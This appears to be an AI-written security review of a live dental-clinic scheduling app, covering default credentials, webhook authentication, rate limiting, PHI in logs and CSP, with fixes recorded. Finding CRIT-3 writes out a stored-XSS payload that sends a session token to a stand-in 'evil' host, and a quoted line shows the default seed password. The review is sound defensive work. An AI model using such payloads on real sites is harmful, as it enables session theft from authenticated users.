# Security Review — Sailz (Shine Dental instance)

Reviewed 2026-07-28 against `server/`, `public/`, `brain/`, `instances/` using four
review lenses adopted from `ecc/agents/`: `security-reviewer.md`,
`healthcare-reviewer.md`, `code-reviewer.md`, `database-reviewer.md`. This app
is live on Railway with real phone traffic; findings assume that threat model
(patient-adjacent PHI once tied to care: names, phone numbers, appointment
times, call summaries/transcripts).

**Read this first:** finding CRIT-1 is an active production credential issue,
not a theoretical one. See the top of the Critical section.

Every HIGH/CRITICAL finding below cites the exact file/line and the concrete
failure scenario, per the code-reviewer lens's evidence bar.

---

## Critical

### CRIT-1 — Owner account uses the unchanged seed default password (ACTIVE IN PRODUCTION)
**Confirmed live** via `railway variables`: `OWNER_PASSWORD` on the production
Railway service is still the value `server/seed.js` falls back to when the
env var is unset — a well-known placeholder, not a generated secret.

- **Failure scenario:** anyone who knows or guesses this common default value
  (it appears verbatim in this repo's `.env.example` and in countless
  boilerplate templates) can `POST /api/auth/login` as the clinic owner and
  gain full access: every lead/call/appointment/transcript, claim approval,
  agent execution (including real outbound calling via the setter agent),
  and calendar block/cancel.
- **Fix (do this first, before anything else in this review):** log in with
  the current password, then call the existing `POST /api/auth/change-password`
  endpoint to set a strong one. **Do not** fix this by re-running `npm run
  seed` — `seed.js` unconditionally deletes and rebuilds `data/db.json`
  (`fs.unlinkSync(DB_PATH)`), which would destroy every real lead, call,
  appointment, and claim currently on file.

### CRIT-2 — JWT secret has an insecure hardcoded fallback
`server/server.js:28`
```js
const SECRET = process.env.JWT_SECRET || "dev-secret-change-me";
```
Not currently exploited — `railway variables` confirms a real random
`JWT_SECRET` is set in production. But the code permits silent, unsafe
fallback: any future redeploy, a fresh environment, or a config mistake that
drops the env var would boot successfully and sign/verify tokens with a
secret that's sitting in the public repo history. The guard only activates
when `NODE_ENV=production` — that var was **not previously set on Railway**
(checked via `railway variables`), which would have left the new guard
dormant despite being deployed; set it during this review so the fix is
actually live, not just present in code. **Fix:** refuse to boot in
production without a real secret (Step 2, done — see below).

### CRIT-3 — Stored XSS via unescaped attribute-context interpolation
`public/index.html`, `openCallDrawer()`:
```js
<audio controls preload="none" src="${esc(c.recordingUrl)}"></audio>
```
`esc()` is a **text-node** escaper (`div.textContent = s; return div.innerHTML`),
which neutralizes `<`, `>`, `&` but — correctly, per the HTML serialization
spec — does **not** escape `"` or `'`, since those aren't special in text-node
context. Used inside a quoted HTML **attribute**, that gap is exploitable:
`c.recordingUrl` comes straight from the Vapi webhook
(`m.recordingUrl ?? m.artifact?.recordingUrl`, `server/server.js:479`) with no
validation. A crafted value like `" onerror="fetch('https://evil/'+sessionStorage.token)` breaks out
of the attribute and executes in the browser of whichever authenticated
owner/staff user opens that call's drawer — a direct path to session-token
theft (the JWT lives in `sessionStorage`, readable by any script on the page).
- **Why existing guards don't catch it:** `esc()` is applied, but it's the
  wrong escaper for this context; nothing else validates or allowlists
  `recordingUrl` before storage or rendering.
- **Exploitability today:** gated by whether `VAPI_SERVER_SECRET` is set
  (CRIT-4) — with it set and kept secret, this specific path requires
  compromising Vapi's delivery; without it, any internet request can trigger
  this.
- **Fix:** hardened the shared `esc()` in both `index.html` and `brain.html`
  to also encode `"`/`'` as HTML entities. The browser's attribute-value
  parser decodes entities before treating any character as the closing
  quote, so `&quot;` inside `src="...&quot;..."` can no longer terminate the
  attribute early — this closes the hole at the root (every current and
  future attribute-context use of `esc()`), not just this one call site.
  Done — see below.

### CRIT-4 — Webhook authenticity is optional
- `server/server.js:383` — Vapi: `if (process.env.VAPI_SERVER_SECRET && ...)` — only checks the header **if the env var happens to be set**; no boot-time signal if it isn't.
- `server/server.js:509` (`app.post("/webhooks/meta", ...)`) — **zero** signature verification on the lead-payload endpoint. The `GET` handler checks `hub.verify_token` (Meta's subscription-challenge step), but the actual `POST` that writes leads has no authenticity check at all — anyone who finds the URL can inject arbitrary "leads" into the live database.
- `server/server.js:526` — Google Ads webhook has an optional key check (`GOOGLE_ADS_WEBHOOK_KEY`), same optional-if-set pattern as Vapi.

**Fix (Step 2):** boot-time warning when `VAPI_SERVER_SECRET`/`GOOGLE_ADS_WEBHOOK_KEY` are unset; implemented `X-Hub-Signature-256` HMAC verification for the Meta webhook when `META_APP_SECRET` is set (with a boot warning when it isn't). Done — see below.

---

## High

### HIGH-1 — No rate limiting anywhere
`POST /api/auth/login` has no throttling — a classic credential-stuffing/brute-force
target, and doubly urgent given CRIT-1. `POST /api/chat` has an in-process
20/min/user limiter already (`server/server.js:251-259`) but nothing covers
the webhooks or other mutating routes. **Fix:** `express-rate-limit`, strict
on login (5/15min/IP), moderate ceiling on webhooks. Done — see below.

### HIGH-2 — Login has a timing side-channel (user-exists oracle)
`server/server.js:33-35`:
```js
const u = load().users.find((x) => x.email === email);
if (!u || !bcrypt.compareSync(password || "", u.passHash))
```
`||` short-circuits: when the email doesn't match any user, `bcrypt.compareSync`
(deliberately slow, ~10 rounds) is **never called**, so the response returns
fast. When the email does match, the response is measurably slower. The error
message is already uniform ("Invalid email or password" either way — good),
but response timing itself leaks whether an email is a valid account, which
is real reconnaissance value for a targeted attack (especially with only one
owner account plus whatever staff get invited). **Fix:** always run a
constant-time-equivalent bcrypt comparison against a dummy hash when no user
matches, so both paths cost the same. Done — see below.

### HIGH-3 — Full PHI written to the persistent, multi-user-visible activity log
Every entry in `db.activity` is visible to **any authenticated user** (not
just the owner) via the dashboard and the department "team activity" feed.
Confirmed call sites writing unmasked phone numbers or full message content:
- `server/server.js:406` — `` `${lead.name} (${lead.phone}) called in...` ``
- `server/server.js:499` — `call.who` can itself *be* the raw phone number (when Vapi has no caller-ID name), interpolated straight into the log message.
- `server/notify.js:24,26,37,38,41,49,59,60,63` — nine call sites logging the raw recipient (`${to}`, a phone number or email) **and**, in the "sent"/"skipped" cases, the **full templated message body** (patient name, service, appointment date/time) via `${body}`/`${subject}`.
- `server/server.js:324,435` — patient name (not phone) in appointment cancel/book logs.

**Fix:** added a `maskPhone()` helper (masks to last 4 digits) and applied it
at every site above; also stopped echoing full SMS/email body content into
the log line (kept type + masked recipient + delivery outcome only — the
activity feed doesn't need to permanently retain the exact appointment
details every time a text goes out). Patient/lead **names** in a handful of
mutation logs (booked/cancelled) were left as-is — removing them entirely
would make the audit trail useless for actual staff use, and the explicit ask
was phone-number masking; flagged here for awareness, not blocking.

### HIGH-4 — Owner password printed to stdout on every seed run
`server/seed.js:74`:
```js
console.log("Login:", db.users[0].email, "/", process.env.OWNER_PASSWORD || "changeme123");
```
Railway retains deployment logs; this line puts the live owner password in
plaintext log history on every seed/redeploy. **Fix:** removed the password
from the log line; prints a reminder to check `OWNER_PASSWORD` in the env
instead. Done — see below.

### HIGH-5 — No security headers
No CSP, `X-Frame-Options`, `X-Content-Type-Options`, etc. **Fix:** `helmet`
with a CSP compatible with `brain.html`'s existing inline `<script
type="module">` blocks and its `cdnjs`/`fonts.googleapis.com`/
`fonts.gstatic.com` resource loads. Done — see below.

Verification (via real Playwright/Chrome, not just a header check) caught
two real regressions the naive "allow self + cdnjs + fonts" config would
have shipped silently broken:
1. Helmet defaults `script-src-attr`/`style-src-attr` to `'none'`
   **independently** of `script-src`/`style-src` — these are separate
   directives specifically for inline event-handler attributes
   (`onclick="..."`) and inline `style="..."` attributes, both used
   throughout this no-build-step app. Without allowing them too, the login
   button (and every dynamically-colored element) silently stopped working.
2. PixiJS 7's WebGL renderer itself requires `'unsafe-eval'` in `script-src`
   for shader/geometry program compilation — without it, PixiJS threw "does
   not allow unsafe-eval" and the brain map never rendered at all. This is a
   documented PixiJS limitation (they ship a separate `@pixi/unsafe-eval`
   module to avoid it, out of scope here).

Both dashboards confirmed rendering identically to pre-CSP screenshots after
the fix.

### HIGH-6 — npm audit: 6 HIGH findings, one root cause, no fix published yet
```
brace-expansion <=5.0.7 (GHSA-mh99-v99m-4gvg, DoS via unbounded expansion)
  → minimatch → glob → rimraf → gaxios → googleapis-common
```
`npm audit fix` and `npm audit fix --force --dry-run` both report **no
resolution path available** — no compatible upstream release exists yet in
`googleapis`'s dependency chain. **Assessed exploitability: low in this
deployment.** `brace-expansion`/`minimatch`/`glob`/`rimraf` are internal to
`googleapis-common`'s own tooling; nothing in this codebase passes
request-derived input into a glob/minimatch pattern anywhere — the only
`googleapis` calls made are `calendar.freebusy.query`, `.events.list`,
`.events.insert`, none of which touch the vulnerable code path. **Action:**
tracked, not blocking; re-run `npm audit` periodically until a patched
`gaxios`/`googleapis-common` ships.

---

## Medium

### MED-1 — Error messages leak internals to the client
`/api/chat` (`server/server.js:269`) and `/api/agents/:id/run`
(`server/server.js:139`) both do `res.status(500).json({ error: e.message })`,
returning the raw exception text (could include a stack fragment, an
upstream API's internal error string, etc.) to the authenticated caller.
Lower severity than the items above since this is an owner/staff-only
internal dashboard, not a public API, but worth tightening. **Not fixed in
this pass** — outside the user's explicit Step 2 list; recommend a follow-up
that logs the full error server-side and returns a generic message.

### MED-2 — Data at rest is plaintext on the Railway volume
`data/db.json` holds the full PHI-adjacent dataset unencrypted. No backup
existed before this review. **Fix (Step 3):** nightly gzip backup job, last
14 kept in `data/backups/` on the same volume; documented restore procedure
and the recommendation for offsite backup before a second client, in the
README. Done — see below. Full disk/application-layer encryption is out of
scope per this task's instructions.

### MED-3 — JWT verify doesn't pin the algorithm
`jwt.verify(token, SECRET)` (`server/server.js:41`) doesn't pass an
`algorithms` allowlist. Not currently exploitable — `jsonwebtoken` v9 already
rejects `alg:"none"` by default, and this codebase never uses an asymmetric
key anywhere (so the classic RS256/HS256 confusion attack, which requires a
public key being reused as an HMAC secret, doesn't apply — there's no public
key in this system at all). Recommended as defense-in-depth for if this ever
changes; not fixed in this pass to stay within Step 2's explicit scope.

### MED-4 — Single in-memory `db` cache has no concurrency control
`server/store.js` keeps one module-level `db` object, mutated in place and
flushed to disk via `writeFileSync` + atomic rename. Safe under Railway's
current single-replica deployment (Node is single-threaded per process). If
this ever scales to multiple replicas, each would have its own stale
in-memory copy and the last writer would silently clobber the others' writes
— flagged for awareness, not an issue today.

---

## Low

- Staff/owner **emails** (not patient data) appear in a couple of activity
  log lines (`server/server.js:61,79` — invite, password-change). Lower
  sensitivity than patient PHI; left as-is, noted for completeness.
- No **read-access** audit logging exists — the activity log captures
  mutations (booked, confirmed, cancelled, approved) but not views (e.g. "X
  opened lead Y's detail"). A stricter HIPAA posture would log PHI reads too.
  Documented as a gap in `HIPAA-POSTURE.md` rather than implemented — it's a
  meaningfully larger change (every PHI-touching GET route would need it)
  than this task's Step 2 scope.
- `GET /api/health` didn't exist before this review. Added (Step 3).

---

## Database-reviewer notes

This is a flat JSON-file store (`server/store.js`), not PostgreSQL — most of
the `database-reviewer` checklist (indexes, RLS policies, `EXPLAIN ANALYZE`,
composite index ordering, connection pooling) doesn't apply to this
architecture. The relevant equivalents were folded into the findings above:
data-at-rest exposure (MED-2), concurrent-write safety (MED-4), and no
SQL-injection surface exists (no SQL is ever constructed — confirmed via
`grep` across `server/`).

---

## Healthcare-reviewer notes

Sailz is a front-office scheduling/lead-capture app, not a CDSS — the
drug-interaction/dose-validation/clinical-scoring checklist items in
`healthcare-reviewer.md` don't apply (no clinical decision logic exists in
this codebase). PHI-protection and audit-trail items were reviewed and are
reflected above (HIGH-3, and the read-audit gap under Low). No CASCADE DELETE
concept exists (no relational schema); appointment cancellation is additive
(`status: "cancelled"`, never a row delete — confirmed in
`POST /api/appointments/:id/cancel`).

---

## Auth/passHash verification (explicit ask)

Grepped every `res.json(`/`res.send(` call site across `server/*.js`
(29 sites). Confirmed clean: `/api/users/invite` and `GET /api/users` both
explicitly destructure `passHash` out before responding; no other route
touches `db.users`. **No endpoint returns `passHash`.** Login failure message
is uniform text regardless of cause (HIGH-2 above covers the timing
side-channel, which is a separate issue from message content).

---

## Summary

| Severity | Count | Status after this pass |
|----------|-------|-------------------------|
| CRITICAL | 4     | CRIT-1 requires your action (change the password); CRIT-2, 3, 4 fixed in code |
| HIGH     | 6     | All fixed except HIGH-6 (no upstream fix exists yet — tracked) |
| MEDIUM   | 4     | MED-2 fixed (backups); MED-1, 3, 4 documented, not fixed (out of Step 2 scope or not currently exploitable) |
| LOW      | 3     | Documented |

**Verdict:** BLOCK on CRIT-1 until you rotate the owner password — everything
else in this list is either fixed in this pass or explicitly tracked with a
documented reason it wasn't.
